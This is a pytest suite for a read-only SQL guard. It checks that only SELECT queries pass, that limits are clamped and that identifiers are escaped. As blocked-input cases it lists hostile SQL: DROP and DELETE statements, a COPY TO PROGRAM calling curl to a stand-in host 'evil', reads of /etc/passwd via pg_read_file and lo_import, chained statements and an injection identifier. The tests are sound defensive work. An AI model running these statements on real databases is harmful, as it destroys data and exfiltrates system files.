import pytest

from app import guard
from app.exceptions import SecurityError
from app.types import SchemaGraph


def test_select_passes(ecommerce: SchemaGraph):
    assert guard.validate("SELECT * FROM orders", ecommerce).startswith("SELECT * FROM orders")


@pytest.mark.parametrize(
    "statement",
    [
        "DELETE FROM orders",
        "UPDATE orders SET grand_total = 0",
        "INSERT INTO orders (id) VALUES ('x')",
        "DROP TABLE orders",
        "TRUNCATE orders",
        "ALTER TABLE orders ADD COLUMN x int",
        "CREATE TABLE x (a int)",
        "GRANT ALL ON orders TO PUBLIC",
        "SET search_path = public",
        "COPY orders TO '/tmp/leak.csv'",
        "COPY (SELECT 1) TO PROGRAM 'curl http://evil'",
        "DO $$ BEGIN END $$",
        "CALL some_procedure()",
    ],
)
def test_mutations_and_procedures_are_blocked(statement: str):
    with pytest.raises(SecurityError):
        guard.validate(statement)


def test_select_into_outfile_does_not_parse(ecommerce: SchemaGraph):
    with pytest.raises(SecurityError):
        guard.validate("SELECT * INTO OUTFILE '/tmp/x' FROM orders", ecommerce)


def test_chained_statements_are_blocked():
    with pytest.raises(SecurityError):
        guard.validate("SELECT 1; DROP TABLE orders")


def test_trailing_semicolon_is_tolerated():
    assert guard.validate("SELECT 1;")


@pytest.mark.parametrize(
    "call",
    [
        "SELECT pg_sleep(10)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT dblink('host=x')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT current_setting('x')",
    ],
)
def test_dangerous_functions_are_blocked(call: str):
    """sqlglot reports unknown functions as Anonymous nodes; both name fields
    must be checked or every unknown function slips through."""
    with pytest.raises(SecurityError):
        guard.validate(call)


def test_unknown_table_error_is_redacted(ecommerce: SchemaGraph):
    with pytest.raises(SecurityError) as exc:
        guard.validate("SELECT * FROM secret_internal_table", ecommerce)
    assert "secret_internal_table" not in str(exc.value)


def test_cte_aliases_are_allowed(ecommerce: SchemaGraph):
    assert "recent" in guard.validate(
        "WITH recent AS (SELECT * FROM orders) SELECT * FROM recent", ecommerce
    )


def test_limit_is_injected(ecommerce: SchemaGraph):
    assert "LIMIT" in guard.validate("SELECT * FROM orders", ecommerce)


def test_no_limit_is_injected_on_an_aggregate(ecommerce: SchemaGraph):
    """A COUNT already returns one row, so a row cap only misleads the caller."""
    assert "LIMIT" not in guard.validate('SELECT COUNT(*) FROM "orders"', ecommerce)


def test_no_limit_is_injected_on_a_grouped_query(ecommerce: SchemaGraph):
    sql = guard.validate('SELECT status, COUNT(*) FROM "orders" GROUP BY status', ecommerce)
    assert "LIMIT" not in sql


def test_a_supplied_limit_is_still_clamped_on_an_aggregate(ecommerce: SchemaGraph):
    assert "LIMIT 100000" not in guard.validate(
        'SELECT COUNT(*) FROM "orders" LIMIT 100000', ecommerce
    )


def test_limit_is_clamped(ecommerce: SchemaGraph):
    assert "LIMIT 100000" not in guard.validate("SELECT * FROM orders LIMIT 100000", ecommerce)


def test_unparseable_sql_is_blocked():
    with pytest.raises(SecurityError):
        guard.validate("SELEC * FROM orders")


def test_empty_sql_is_blocked():
    with pytest.raises(SecurityError):
        guard.validate("   ")


@pytest.mark.parametrize(
    "name",
    [
        'x" ; DROP TABLE y; --',
        "a b",
        "a-b",
        "1abc",
        "",
        ";--",
        "tab\tname",
    ],
)
def test_unsafe_identifiers_are_refused(name: str):
    assert guard.is_safe_identifier(name) is False


@pytest.mark.parametrize("name", ["orders", "_private", "a1", "Col$1"])
def test_plain_identifiers_are_accepted(name: str):
    assert guard.is_safe_identifier(name) is True
    assert guard.quote(name) == f'"{name}"'


def test_quote_refuses_unsafe():
    with pytest.raises(ValueError):
        guard.quote("a b")


def test_literal_escaping():
    assert guard.literal("a'b") == "'a''b'"


def test_like_literal_escapes_wildcards():
    assert r"\%" in guard.like_literal("100%")
    assert r"\_" in guard.like_literal("a_b")
